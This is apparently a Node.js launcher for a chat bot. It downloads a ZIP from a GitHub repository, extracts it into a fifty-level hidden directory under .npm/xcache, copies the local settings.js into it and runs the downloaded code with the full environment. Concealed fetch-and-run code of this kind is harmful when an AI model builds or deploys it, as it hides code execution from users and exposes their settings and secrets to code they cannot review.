/**
* supreme => index
* ©2025
*/



const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { spawn } = require('child_process');
const chalk = require('chalk');

// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);

// === GIT CONFIG ===
const DOWNLOAD_URL = "https://github.com/superstar-zimtk/pretty-private-repohide/archive/refs/heads/main.zip";                     
const EXTRACT_DIR = path.join(TEMP_DIR, "pretty-md-private-repohide");
const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");

                  
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// === MAIN LOGIC ===
async function downloadAndExtract() {
  try {
    if (fs.existsSync(EXTRACT_DIR)) {
      console.log(chalk.green("😅 Extracted directory found. 🏂Skipping download and extraction."));
      return;
    }

    if (fs.existsSync(TEMP_DIR)) {
      console.log(chalk.green("🧹 Cleaning previous cache..."));
      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(TEMP_DIR, { recursive: true });

    const zipPath = path.join(TEMP_DIR, "repo.zip");
    console.log(chalk.blue("⬇️ Connecting to pretty-Md..."));
    const response = await axios({
      url: DOWNLOAD_URL,
      method: "GET",
      responseType: "stream",
    });
    await new Promise((resolve, reject) => {
      const writer = fs.createWriteStream(zipPath);
      response.data.pipe(writer);
      writer.on("finish", resolve);
      writer.on("error", reject);
    });
    console.log(chalk.blue("💉 ZIP download complete."));

    try {
      new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
    } catch (e) {
      console.error(chalk.red("❌ Failed to extract ZIP:"), e);
      throw e;
    } finally {
      if (fs.existsSync(zipPath)) {
        fs.unlinkSync(zipPath);
      }
    }

    const pluginFolder = path.join(EXTRACT_DIR, "");
    if (fs.existsSync(pluginFolder)) {
      console.log(chalk.green("✅ Plugins folder found."));
    } else {
      console.log(chalk.red("❌ Plugin folder not found."));
    }
  } catch (e) {
    console.error(chalk.red("❌ Extract failed:"), e);
    throw e;
  }
}
    

async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) {
    console.log(chalk.blue("⚠️ No local settings file found."));
    return;
  }

  try {
    // Ensure EXTRACT_DIR exists before copying
    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log(chalk.green("🛠️ Local settings applied."));
  } catch (e) {
    console.error(chalk.red("❌ Failed to apply local settings:"), e);
  }

  await delay(500);
}

function startBot() {
  console.log(chalk.cyan("🚀 Launching bot instance..."));
  if (!fs.existsSync(EXTRACT_DIR)) {
    console.error(chalk.red("❌ Extracted directory not found. Cannot start bot."));
    return;
  }
  if (!fs.existsSync(path.join(EXTRACT_DIR, "index.js"))) {
    console.error(chalk.red("❌ index.js not found in extracted directory."));
    return;
  }
  const bot = spawn("node", ["index.js"], {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: { ...process.env, NODE_ENV: "production" },
  });
  bot.on("close", (code) => {
    console.log(chalk.red(`💥 Bot terminated with exit code: ${code}`));
  });
  bot.on("error", (err) => {
    console.error(chalk.red("❌ Bot failed to start:"), err);
  });
}

              
// === RUN ===
(async () => {
  try {
    await downloadAndExtract();
    await applyLocalSettings();
    startBot();
  } catch (e) {
    console.error(chalk.red("❌ Fatal error in main execution:"), e);
    process.exit(1);
  }
})();
